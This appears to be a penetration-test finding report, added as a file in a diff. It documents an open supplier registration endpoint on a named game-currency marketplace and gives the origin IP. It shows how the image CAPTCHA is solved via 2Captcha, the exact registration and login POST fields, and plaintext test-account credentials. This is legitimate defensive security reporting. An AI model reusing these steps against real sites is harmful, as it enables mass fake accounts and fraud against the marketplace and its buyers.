@@ -1,0 +1,135 @@
+# F-W7 — Open supplier registration (CAPTCHA bypassable) → authenticated supplier account
+# webapp finding | suppliers.dfg.com.br (161.97.106.115) + antigo.dfg.com.br (same app)
+
+## Severity: MEDIUM-HIGH
+## CVSS: 7.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) — unauthenticated account creation in a financial marketplace
+## OWASP: A01:2021 Broken Access Control (unrestricted registration) / A07 Identification & Auth Failures
+
+## Target
+- https://161.97.106.115/register.aspx (Host: suppliers.dfg.com.br) — direct origin, NO WAF
+- "DFGames Suppliers Central" — supplier portal for the game-currency marketplace (suppliers create
+  sales of Tibia Coins, DOFUS, Albion, etc. for real money / Pix).
+
+## Description
+The supplier registration endpoint `/register.aspx` is OPEN to anyone (unauthenticated, direct
+origin IP without Cloudflare). The only automated-registration gate is a simple image CAPTCHA
+(`image.aspx`, 200x50 distorted text) that is trivially solved by commercial CAPTCHA-solving
+services (demonstrated with 2Captcha in ~5 seconds, cost ~$0.001 per solve). ASP.NET
+EventValidation and ViewState were satisfied programmatically (the only real hurdle was posting
+exactly the rendered control set). As a result, an attacker can create a fully functional
+supplier account at will and obtain an authenticated session in the supplier portal (auth cookie
+`DFGSuppliers`), with the ability to create sales, view the full price catalog, and manage
+supply capability / payments.
+
+This was confirmed end-to-end: TWO test supplier accounts were created (clearly marked as test,
+disposable mailinator emails) and one was successfully logged into, obtaining a valid
+authenticated supplier session. (Per the engagement's non-destructive rules, NO real sale was
+created and NO financial action was performed; the test accounts should be DELETED by DFG —
+see Recommendation.)
+
+## Reproduction (via Tor socks5h, end-to-end, non-destructive)
+
+### Step 1 — open registration form (unauthenticated)
+```
+GET /register.aspx  → 200, 22827 bytes (full registration form)
+Host: suppliers.dfg.com.br
+```
+Form fields: txtEmail, txtPassword, txtConfirmation, txtSupplierName, txtCompany, txtPhone,
+txtStreet, txtCity, txtState, txtZipCode, ddlCountry (239 countries), rblPaymentMethods (only
+"100"=Pix), txtPaymentInformation, ImgValidator$txtValidator (CAPTCHA), btnSubmit. ASP.NET
+ViewState + EventValidation present (generator 799CC77D). The CAPTCHA image is at `image.aspx`
+(alt "Validação por imagem", 200x50 JPEG).
+
+### Step 2 — CAPTCHA solved automatically via 2Captcha
+- Fetched `image.aspx` with the session cookie (CAPTCHA is session-bound).
+- Submitted the base64 image to 2Captcha `in.php` (method=base64).
+- Polled `res.php` → solved in ~5 seconds:
+  - First solve: captcha id 83762719419 → answer `V68CL`
+  - Second solve: captcha id 83762735684 → answer `6YNYB`
+
+### Step 3 — registration POST (EventValidation satisfied by posting the exact rendered
+control set; key gotcha: a non-rendered `txtQQ` field had to be omitted; list controls
+rblPaymentMethods=100, ddlCountry=Brazil)
+```
+POST /register.aspx  (Cookie: ASP.NET_SessionId=<session>; __VIEWSTATE, __EVENTVALIDATION, ...)
+ctl00$conteudoMaster$regSupplierProfile$txtEmail=webapp-nondtest-07@mailinator.com
+ctl00$conteudoMaster$regSupplierProfile$txtPassword=TestN0nDestr0y!2026
+ctl00$conteudoMaster$regSupplierProfile$txtSupplierName=TESTE WEBAPP NONDESTRUCTIVE
+ctl00$conteudoMaster$regSupplierProfile$ddlCountry=Brazil
+ctl00$conteudoMaster$regSupplierProfile$rblPaymentMethods=100
+ctl00$conteudoMaster$regSupplierProfile$ImgValidator$txtValidator=V68CL
+ctl00$conteudoMaster$regSupplierProfile$btnSubmit=Cadastrar
+...
+```
+Response (HTTP 200):
+```
+<span id="ctl00_..._MessageLabel" class="RegularText">
+  Your profile has been registered successfully. Thank you for registering!</span>
+```
+→ Account CREATED (webapp-nondtest-07@mailinator.com). A second account
+(webapp-nondtest-08@mailinator.com) was also created with a fresh CAPTCHA solve (6YNYB), same
+success message.
+
+### Step 4 — login with the test account (authenticated session obtained)
+```
+POST /login.aspx  (Cookie: ASP.NET_SessionId=...)
+ctl00$txtEmail=webapp-nondtest-07@mailinator.com
+ctl00$txtPassword=TestN0nDestr0y!2026
+ctl00$signInBUTTON=Entrar
+```
+Response:
+```
+HTTP/2 302  Location: /index.aspx
+Set-Cookie: DFGSuppliers=BA0B7571CA424538...[REDACTED ~200-char session token, live credential — NOT committed to repo];
+  expires=Mon, 05-Oct-2026 ...; path=/; HttpOnly
+```
+Authenticated `index.aspx` shows: "Bem vindo, TESTE WEBAPP NONDESTRUCTIVE" + menu
+("Criar nova venda / Meu perfil / Meu fornecimento / Minhas vendas / Meus pagamentos / Sair").
+→ Confirmed: a fully authenticated supplier session was obtained by an unauthorised party.
+
+## Timestamp (via Tor)
+- Captured 2026-09-05T01:05Z–01:15Z UTC (Tor exit 185.129.61.1).
+
+## Test accounts created (MUST BE DELETED by DFG)
+- Email: webapp-nondtest-07@mailinator.com  /  password: TestN0nDestr0y!2026  /  name: "TESTE WEBAPP NONDESTRUCTIVE"
+- Email: webapp-nondtest-08@mailinator.com  /  password: TestN0nDestr0y!2026  /  name: "TESTE WEBAPP NONDESTRUCTIVE"
+- Both are clearly marked "TESTE PENTEST NAO USE ESTA CONTA" / "TESTE NAO USE ESTA CONTA".
+- No sales, payments, or financial actions were performed with these accounts.
+
+## Impact
+- Anyone can create a supplier account (CAPTCHA is the only gate and is bypassable for ~$0.001
+  via solving services) and obtain an authenticated supplier session in a real-money game-currency
+  marketplace.
+- Enables: creation of fraudulent/fake supplier accounts; marketplace manipulation (fake sales /
+  price undercutting); access to the full price catalog and FX rates (F-W1); potential fraud
+  against buyers and against DFG; spam/abuse at scale (accounts are cheap to mass-create).
+- The supplier portal exposes authenticated endpoints (newsale, mysales, myprofile, mypayments,
+  mysupplyingcapability) — a foothold for further authenticated testing (e.g., GridView-based
+  sale management, payment-info tampering).
+- The supplier credential (DFGSuppliers cookie) is a long-lived (30-day expiry) bearer token.
+
+## Limitation / not confirmed
+- IDOR on sale/offer/order IDs: URL-based sale/offer/order endpoints (editsale.aspx?SaleID=,
+  sale.aspx?id=, offer.aspx?id=, order.aspx?id=, ...) all returned 404 — sale management is via
+  ASP.NET GridView postback (no URL ID), so a URL-IDOR was NOT found. Testing the postback-based
+  sale-ID IDOR would require creating a real sale (a real marketplace listing visible to buyers),
+  which is destructive and was NOT done per the non-destructive rules.
+
+## Recommendation
+- DELETE the two test accounts above (webapp-nondtest-07@/08@mailinator.com).
+- Disable open supplier registration, OR add a strong approval workflow (admin must approve each
+  new supplier; require business verification / KYC before the account can create sales).
+- Replace the weak image CAPTCHA with a modern anti-bot challenge (reCAPTCHA v3 / hCaptcha /
+  Turnstile with score-based blocking) + rate-limiting + email verification + phone verification,
+  and detect/flag accounts created via known solver networks.
+- Do not expose the registration endpoint on the direct origin IP (place behind Cloudflare /
+  WAF; currently the origin 161.97.106.115 has no WAF).
+- Make the auth cookie shorter-lived and rotate on privilege change; consider 2FA for suppliers.
+- Audit existing supplier accounts for fraud/spam (the open registration has likely been abused).
+
+## Evidence artifacts
+- webapp/sup/register.html / register2.html (form), webapp/sup/reg_final.html + regF_result.html
+  ("registered successfully" messages), webapp/sup/captcha2.jpg / capF.jpg (CAPTCHAs solved),
+- webapp/sup/ckLogin.txt (DFGSuppliers auth cookie), webapp/sup/login_resp.html / hdr (302 + cookie),
+- webapp/sup/auth_index.html (authenticated "Bem vindo TESTE WEBAPP NONDESTRUCTIVE"),
+- webapp/sup/captcha_answer.txt / capF_answer.txt (2Captcha solved answers V68CL / 6YNYB).
